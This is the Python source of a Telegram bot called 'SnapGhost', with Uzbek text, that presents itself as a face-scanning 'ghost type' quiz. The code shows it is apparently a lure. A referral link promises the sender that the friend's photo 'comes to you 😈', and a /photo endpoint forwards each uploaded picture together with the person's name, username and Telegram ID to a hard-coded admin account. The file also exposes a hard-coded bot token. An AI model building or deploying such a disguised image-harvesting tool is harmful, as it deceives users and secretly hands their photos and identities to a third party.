import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiohttp import web

BOT_TOKEN = "8834440378:AAEwznb4TAwwjZQpcBQPEOEAuYbt7R-k4IU"
ADMIN_ID  = 8794869188
SERVER_URL = os.environ.get("SERVER_URL", "https://YOUR_RAILWAY_URL.up.railway.app")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher()

@dp.message(CommandStart())
async def start(message: types.Message):
    name = message.from_user.first_name or "Do'st"
    uid  = message.from_user.id
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="👻 Ghost turini aniqlash",
            web_app=WebAppInfo(url=f"{SERVER_URL}/?uid={uid}")
        )
    ]])
    await message.answer(
        f"👻 *SnapGhost*\n\n"
        f"Salom {name}! 👋\n\n"
        f"Ghost skaner yuzingizni tahlil qiladi va "
        f"qaysi *ghost belgisiga* mos kelishingizni aniqlaydi!\n\n"
        f"⬇️ Bosing va sinab ko'ring!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.message(F.text == "/link")
async def send_link(message: types.Message):
    uid  = message.from_user.id
    link = f"https://t.me/snapghost_bot?start={uid}"
    await message.answer(
        f"🔗 *Do'stingizga yuboring:*\n\n"
        f"`{link}`\n\n"
        f"_Do'stingiz bosganida rasmi senga keladi_ 😈",
        parse_mode="Markdown"
    )

async def handle_photo(request):
    try:
        data     = await request.post()
        photo    = data.get("photo")
        sender   = data.get("user_id", "unknown")
        username = data.get("username", "")
        fname    = data.get("first_name", "")
        if not photo:
            return web.Response(text="no photo", status=400)
        photo_bytes = photo.file.read()
        caption = (
            f"📸 *Yangi snap!*\n"
            f"👤 Ism: {fname}\n"
            f"🔗 Username: @{username}\n"
            f"🆔 ID: `{sender}`\n\n"
            f"_SnapGhost • by Akhmadov_"
        )
        await bot.send_photo(
            chat_id=ADMIN_ID,
            photo=types.BufferedInputFile(photo_bytes, filename="snap.jpg"),
            caption=caption,
            parse_mode="Markdown"
        )
        return web.Response(text="ok")
    except Exception as e:
        logging.error(f"Photo error: {e}")
        return web.Response(text="error", status=500)

async def handle_index(request):
    uid = request.rel_url.query.get("uid", "unknown")
    with open("webapp/index.html", "r", encoding="utf-8") as f:
        html = f.read()
    html = html.replace("__SERVER_URL__", SERVER_URL).replace("__UID__", uid)
    return web.Response(text=html, content_type="text/html")

async def main():
    app = web.Application(client_max_size=10 * 1024 * 1024)
    app.router.add_get("/", handle_index)
    app.router.add_post("/photo", handle_photo)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    await web.TCPSite(runner, "0.0.0.0", port).start()
    logging.info(f"✅ Server: http://0.0.0.0:{port}")
    logging.info("✅ Bot ishga tushdi")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
